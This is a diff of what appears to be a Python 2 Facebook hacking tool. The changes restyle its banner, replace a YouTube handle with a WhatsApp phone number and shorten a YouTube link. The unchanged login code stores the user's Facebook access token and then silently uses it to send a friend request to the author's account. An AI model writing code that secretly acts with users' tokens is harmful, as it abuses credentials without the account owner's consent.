@@ -50,16 +50,16 @@ def jalan(z):
 logo = """
 \033[0;33m (¯`·.¸¸.·´¯`·.¸¸.·´¯)
 \033[0;33m  ( \                 / )
-\033[0;33m ( \ )    SFG_009     ( / )
-\033[0;33m( ) (   SF_X3_FARAZ   ) ( )
+\033[0;33m ( \ )    𝐒𝐅𝐆_009     ( / )
+\033[0;33m( ) (   𝐒𝐅_𝐗3_𝐅𝐀𝐑𝐀𝐙   ) ( )
 \033[0;33m ( / )   𝐀𝐍𝐎𝐍𝐘𝐌𝐔𝐒     ( \ )
 \033[0;33m  ( /                 \ )
 \033[0;33m  (_.·´¯`·.¸¸.·´¯`·.¸_)
 \033[0;31m_____________________________________________________
 \033[0;31(__   ____________________________________________   _)
-\033[0;38m  | |          Author  = \033[0;96mMASTER_FARAZ_SAAND       \033[0;38m| |
-\033[0;38m  | |          Youtube = \033[0;96mSFG_TECH                 \033[0;38m| |
-\033[0;38m  | |          Facebook= \033[0;96mFARAZ.009TRICKER          \033[0;38m| |
+\033[0;38m  | |          Author  = \033[0;96m𝐌𝐀𝐒𝐓𝐄𝐑_𝐅𝐀𝐑𝐀𝐙_𝐒𝐀𝐀𝐍𝐃       \033[0;38m| |
+\033[0;38m  | |          Whatsapp = \033[0;96m0309-7598442                 \033[0;38m| |
+\033[0;38m  | |          Facebook= \033[0;96m𝐅𝐀𝐑𝐀𝐙.009.𝐓𝐑𝐈𝐂𝐊𝐄𝐑          \033[0;38m| |
 \033[0;31m__\033[0;38m| |\033[0;31m____________________________________________\033[0;38m| |\033[0;31m__
 \033[0;31m(_____________________________________________________)"""
 
@@ -155,7 +155,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;36;40m[☑] Login Done ※'
-				os.system('xdg-open https://www.youtube.com/channel/UCEQQSFDT0J6NtA8PmnIDqyw')
+				os.system('xdg-open https://www.youtube.com/channel/')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
